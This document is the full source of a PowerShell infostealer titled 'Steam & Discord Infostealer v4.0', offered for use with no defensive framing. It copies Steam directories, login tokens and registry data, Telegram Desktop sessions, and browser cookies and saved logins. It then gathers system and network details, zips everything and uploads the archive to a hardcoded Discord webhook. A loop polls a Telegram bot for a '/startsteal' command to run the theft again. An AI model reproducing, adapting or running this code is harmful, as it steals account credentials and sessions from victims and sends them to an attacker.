# Steam & Discord Infostealer v4.0 - Aggressive Grab
# Set parameters
$discordWebhook = "https://discord.com/api/webhooks/1407258124850827396/kkhtvS5us7fN17u9s89uicI8K8Yf29oE-KWmi39NEzVHvQ1DfNwLrZcAIKYhXZI5Vtbk"
$telegramBotToken = "YOUR_TELEGRAM_BOT_TOKEN"
$telegramChatID = "YOUR_TELEGRAM_CHAT_ID"
$tempDir = "$env:TEMP\SteamLogs"
$zipPath = "$env:TEMP\SteamData_$((Get-Date).ToString('yyyyMMdd_HHmmss')).zip"
New-Item -ItemType Directory -Path $tempDir -Force | Out-Null

# 1. AGGRESSIVE STEAM GRAB - Searches all drives
function Get-SteamData {
    $steamDirs = @()
    # A. Search all logical drives for common Steam paths
    Get-PSDrive -PSProvider FileSystem | ForEach-Object {
        $root = $_.Root
        $potentialPaths = @(
            "$root\Program Files (x86)\Steam",
            "$root\Program Files\Steam",
            "$root\Steam",
            "$root\Games\Steam",
            "$root\Valve\Steam"
        )
        foreach ($path in $potentialPaths) {
            if (Test-Path $path) {
                $steamDirs += $path
            }
        }
    }
    # B. Search entire user profile and AppData
    $userPaths = @(
        "$env:USERPROFILE\AppData\Local\Steam",
        "$env:USERPROFILE\AppData\Roaming\Steam",
        "$env:USERPROFILE\Documents\Steam",
        "$env:USERPROFILE\Desktop\Steam",
        "$env:USERPROFILE\Downloads\Steam"
    )
    foreach ($path in $userPaths) {
        if (Test-Path $path) {
            $steamDirs += $path
        }
    }
    # C. ROBOCopy entire Steam directory, ignore errors
    foreach ($steamDir in $steamDirs) {
        $destDir = "$tempDir\Steam_$(Split-Path $steamDir -Leaf)"
        New-Item -ItemType Directory -Path $destDir -Force | Out-Null
        Start-Process -Wait -WindowStyle Hidden -FilePath "robocopy.exe" -ArgumentList "`"$steamDir`" `"$destDir`" /MIR /Z /R:1 /W:1 /LOG+:$tempDir\Robocopy_Log.txt"
    }
}

# 2. Extract tokens from grabbed files
function Get-SteamTokens {
    $tokenFile = "$tempDir\Steam_Tokens.txt"
    "=== Steam Tokens & Session Data ===`r`n" | Out-File $tokenFile -Append
    # A. Parse all .vdf files for tokens and user data
    $vdfFiles = Get-ChildItem -Path $tempDir -Recurse -Include *.vdf
    foreach ($file in $vdfFiles) {
        if ($file.Name -like "*loginusers*" -or $file.Name -like "*config*" -or $file.Name -like "*ssfn*") {
            "--- $($file.FullName) ---" | Out-File $tokenFile -Append
            Get-Content $file.FullName -ErrorAction SilentlyContinue | Out-File $tokenFile -Append
        }
    }
    # B. Check for registry dump
    try {
        reg export "HKCU\Software\Valve\Steam" "$tempDir\steam_registry.reg" /y 2>&1 | Out-Null
        Get-Content "$tempDir\steam_registry.reg" -ErrorAction SilentlyContinue | Out-File $tokenFile -Append
    } catch {}
}

# 3. Steal Telegram sessions
function Get-TelegramData {
    $telegramPaths = @("$env:USERPROFILE\AppData\Roaming\Telegram Desktop", "$env:USERPROFILE\Documents\Telegram Desktop")
    foreach ($path in $telegramPaths) {
        if (Test-Path $path) {
            robocopy.exe "`"$path`" "`"$tempDir\Telegram`" /MIR /Z /R:1 /W:1 /LOG+:$tempDir\Telegram_Copy_Log.txt"
        }
    }
}

# 4. Steal browser data
function Get-BrowserData {
    $browsers = @("Chrome", "MicrosoftEdge", "Firefox", "Opera", "YandexBrowser")
    foreach ($browser in $browsers) {
        try {
            $dataPath = "$env:USERPROFILE\AppData\Local\$browser\User Data\Default"
            if (Test-Path $dataPath) {
                robocopy.exe "`"$dataPath`" "`"$tempDir\Browser_$browser`" "Cookies" "Login Data" "Local Storage" /S /Z /R:1 /W:1
            }
        } catch {}
    }
}

# 5. Get system info
function Get-SystemInfo {
    systeminfo > "$tempDir\SystemInfo.txt"
    ipconfig /all > "$tempDir\Network_Info.txt"
    netstat -ano > "$tempDir\Open_Ports.txt"
}

# 6. Create ZIP
function Compress-Data {
    Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
}

# 7. Send to Discord
function Send-DiscordWebhook {
    curl.exe -F "file1=@$zipPath" $discordWebhook
}

# 8. Telegram control
function Check-TelegramCommand {
    $updates = curl -s "https://api.telegram.org/bot$telegramBotToken/getUpdates"
    $lastMessage = ($updates | ConvertFrom-Json).result[-1].message.text
    if ($lastMessage -eq "/startsteal") {
        Execute-Stealer
        Send-DiscordWebhook
        curl -s "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$telegramChatID&text=Stealer executed. Data sent."
    }
}

# Main execution
function Execute-Stealer {
    Get-SteamData
    Get-SteamTokens
    Get-TelegramData
    Get-BrowserData
    Get-SystemInfo
    Compress-Data
}

# Run and loop
Execute-Stealer
Send-DiscordWebhook
while ($true) {
    Check-TelegramCommand
    Start-Sleep -Seconds 30
}
